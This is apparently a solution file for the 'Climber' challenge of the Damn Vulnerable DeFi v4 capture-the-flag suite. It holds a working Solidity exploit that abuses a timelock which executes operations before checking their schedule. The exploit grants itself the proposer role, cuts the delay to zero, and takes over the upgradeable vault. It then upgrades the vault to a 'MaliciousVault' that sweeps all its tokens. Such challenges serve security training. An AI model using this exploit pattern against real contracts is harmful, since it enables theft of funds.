// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Recover {
    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;
    address recoveryAddress;

    address[] targets = new address[](4);
    uint256[] values = new uint256[](4);
    bytes[] dataElements = new bytes[](4);

    constructor(
        address vaultAddress,
        address timelockAddress,
        address tokenAddress,
        address recoveryAddress_
    ) {
        vault = ClimberVault(vaultAddress);
        timelock = ClimberTimelock(payable(timelockAddress));
        token = DamnValuableToken(tokenAddress);
        recoveryAddress = recoveryAddress_;

        targets[0] = address(timelock);
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );

        targets[1] = address(timelock);
        dataElements[1] = abi.encodeWithSignature(
            "updateDelay(uint64)",
            uint64(0)
        );

        targets[2] = address(vault);
        dataElements[2] = abi.encodeWithSignature(
            "transferOwnership(address)",
            address(this)
        );

        targets[3] = address(this);
        dataElements[3] = abi.encodeWithSignature("scheduleTimelock()");

        for (uint256 i = 0; i < 4; i++) {
            values[i] = 0;
        }
    }

    function scheduleTimelock() external {
        timelock.schedule(
            targets,
            values,
            dataElements,
            bytes32(0)
        );
    }

    function recover() external {
        //create 4 operations for the timelock to execute
        timelock.execute(
            targets,
            values,
            dataElements,
            bytes32(0)
        );

        address maliciousVault = address(new MaliciousVault());
        vault.upgradeToAndCall(maliciousVault, abi.encodeWithSignature("withdrawAll(address,address)", address(token), recoveryAddress));
    }
}

contract MaliciousVault is ClimberVault {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    function withdrawAll(address token, address recoveryAddress) external {
        SafeTransferLib.safeTransfer(token, recoveryAddress, IERC20(token).balanceOf(address(this)));
    }
}